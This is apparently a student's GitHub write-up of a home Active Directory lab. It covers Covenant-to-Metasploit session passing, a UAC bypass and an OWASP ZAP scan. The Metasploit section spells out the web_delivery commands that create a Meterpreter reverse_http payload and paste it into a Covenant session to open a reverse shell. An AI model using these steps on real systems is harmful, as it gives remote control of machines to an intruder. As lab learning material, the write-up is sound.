In this phase, I focused on advanced networking techniques involving port forwarding, proxying through SOCKS, session passing, and autorouting, using both Covenant and Metasploit.

### Integrating Covenant with Metasploit
- Utilized session passing from Covenant to Metasploit due to Covenant's lack of native SOCKS functionality.
- Aimed to generate a route for the victim machine (Workstation 01) and set up port forwarding to redirect traffic to the Covenant machine.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/80a43967-cd9e-44e5-a6c6-af9a0b81e3b4)

### Generating Shellcode Payload in Metasploit
- Generated a shellcode payload in Metasploit for a reverse shell on Workstation 01.
- Searched for "web_delivery" in Metasploit to find the suitable module.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/a1dd2738-295d-4ead-8b07-f60a52260196)

`msf5 > use 1`
`msf5 > exploit(multi/script/web_delivery) > set target 2`
`msf5 > exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_http`

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/7ad95577-8672-4675-9290-6d2b9a93e834)

`msf5 > exploit(multi/script/web_delivery) > options`
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/34de4f18-89c1-4473-a56b-da4f21e6ab35)

  `msf5 > exploit(multi/script/web_delivery) > set lhost eth0`
  `msf5 > exploit(multi/script/web_delivery) > set lport 8081`
  `msf5 > exploit(multi/script/web_delivery) > exploit -j`
  
- Executed the exploit and copied the generated payload.

![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/1058a7e7-b444-4546-85cd-01877e469fdc)

`msf5 > exploit(multi/script/web_delivery) > exploit -j`
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/16e9943a-1508-441c-a73f-06e8465515a3)

Now copy this payload.
- Go back over to the covenant session:
- Blue screen interface.
- Paste the payload and then hit "Enter"
   `msf5 > exploit(multi/script/web_delivery) > sessions`
![image](https://github.com/CertainRisk/ActiveDirectory-PrivilegeEscalation/assets/141761181/f4dd4192-4eea-4170-81c7-770bd0764d4f)

TBC

## Privilege Escalation and Security Testing

### Windows Server 2019 - Privilege Escalation
- **Using Covenant with Metasploit**: Successfully conducted a User Account Control (UAC) bypass attack on Windows Server 2019. This complex process involved leveraging Covenant integrated with Metasploit for effective privilege escalation.

  ![UAC Bypass Using Covenant](Pasted image link here)

### Vulnerability Assessment on UbuntuMail VM
- **OWASP ZAP Usage**: Employed OWASP ZAP, a powerful security testing tool, to identify and analyze vulnerabilities in the UbuntuMail VM. The process included setting up and configuring the tool, followed by thorough testing and result analysis.

  ![OWASP ZAP Analysis](Pasted image link here)

### Key Learnings and Outcomes
- **Developed Deep Understanding**: Gained a profound understanding of Active Directory's intricacies, the nuances of privilege escalation, and vulnerability assessment.
- **Hands-On Experience**: Acquired practical experience in using advanced security tools and techniques in a controlled environment.
- **Problem-Solving Skills**: Honed problem-solving skills, especially in troubleshooting and overcoming various setup and configuration challenges.

## Conclusion
This journey through setting up Windows Server 2019, implementing Active Directory, conducting privilege escalation, and performing vulnerability assessment using OWASP ZAP has been an enriching experience. It not only augmented my technical skills but also strengthened my problem-solving abilities and attention to detail in the field of cybersecurity.


